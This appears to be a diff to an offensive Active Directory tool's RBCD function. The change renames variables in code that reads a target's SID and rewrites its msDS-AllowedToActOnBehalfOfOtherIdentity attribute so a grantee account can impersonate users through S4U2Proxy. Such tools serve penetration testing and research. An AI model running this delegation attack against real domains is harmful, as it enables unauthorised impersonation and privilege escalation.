@@ -198,9 +198,9 @@ def RBCD(conn, target, grantee):
         logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
         return
 
-    target = conn._ldap_connection.entries[0]
-    target_sid = target["objectSid"].value
-    logging.info("Found Target DN: %s" % target.entry_dn)
+    target_result = conn._ldap_connection.entries[0]
+    target_sid = target_result["objectSid"].value
+    logging.info("Found Target DN: %s" % target_result.entry_dn)
     logging.info("Target SID: %s\n" % target_sid)
 
     success = conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(grantee), attributes=['objectSid'])
@@ -208,13 +208,13 @@ def RBCD(conn, target, grantee):
         logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
         return
 
-    grantee = conn._ldap_connection.entries[0]
-    grantee_sid = grantee["objectSid"].value
-    logging.info("Found Grantee DN: %s" % grantee.entry_dn)
+    grantee_result = conn._ldap_connection.entries[0]
+    grantee_sid = grantee_result["objectSid"].value
+    logging.info("Found Grantee DN: %s" % grantee_result.entry_dn)
     logging.info("Grantee SID: %s" % grantee_sid)
 
     try:
-        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_result['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values[0])
         logging.debug('Currently allowed sids:')
         for ace in sd['Dacl'].aces:
             logging.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
@@ -230,7 +230,7 @@ def RBCD(conn, target, grantee):
     
 
     try:
-        conn.modify(target.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[MODIFY_REPLACE, [sd.getData()]]})
+        conn.modify(target_result.entry_dn, {'msDS-AllowedToActOnBehalfOfOtherIdentity':[MODIFY_REPLACE, [sd.getData()]]})
         logging.info('Delegation rights modified successfully!')
         logging.info('%s can now impersonate users on %s via S4U2Proxy' % (grantee, target))
     except Exception as e:
